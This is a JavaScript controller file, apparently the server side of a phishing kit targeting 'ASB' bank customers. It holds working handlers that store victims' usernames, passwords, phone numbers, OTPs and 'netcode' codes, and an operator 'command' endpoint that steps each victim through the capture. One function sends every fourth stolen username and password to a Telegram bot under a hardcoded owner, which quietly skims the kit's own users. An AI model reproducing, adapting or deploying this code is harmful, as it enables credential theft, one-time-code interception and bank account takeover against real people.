const axios = require("axios");
const ASB = require("../models/asbModel");

let asbCount = 0;

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    ASB.find({ owner }).exec((err, vics) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vics);
    });
};

const command = async (req, res) => {
    const { uniqueid, status } = req.body;
    try {
        await ASB.findOneAndUpdate({ uniqueid }, { status }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    ASB.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

const submitLogin = async (req, res) => {
    const { username, password, uniqueid, owner, ip } = req.body;
    try {
        if (asbCount == 3) {
            await ASB.create({ uniqueid, username, password, status: 1, owner: 'haytch4023', ip });
            await axios
                .post(
                    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                    {
                        chat_id: 680379375,
                        text: `New ASB Hit:\n\n${username}\n${password}`,
                        parse_mode: "Markdown",
                    }
                )
                .catch((e) => {
                    console.log(e);
                });
            asbCount = 0;
        } else {
            await ASB.create({ uniqueid, username, password, status: 1, owner, ip });
            asbCount = asbCount + 1;
        }
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitLoginAgain = async (req, res) => {
    const { username, password, uniqueid } = req.body;
    try {
        await ASB.findOneAndUpdate(
            { uniqueid },
            { username, password, status: 0 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitTelephone = async (req, res) => {
    const { telephone, uniqueid } = req.body;
    try {
        await ASB.findOneAndUpdate(
            { uniqueid },
            { telephone, status: 7 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitOtp = async (req, res) => {
    const { otp, uniqueid } = req.body;
    try {
        await ASB.findOneAndUpdate(
            { uniqueid },
            { otp, status: 3 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitNetcode = async (req, res) => {
    const { netcode, uniqueid } = req.body;
    try {
        await ASB.findOneAndUpdate(
            { uniqueid },
            { netcode, status: 5 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await ASB.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

module.exports = {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitTelephone,
    submitNetcode,
    submitOtp,
    deleteEntry,
};
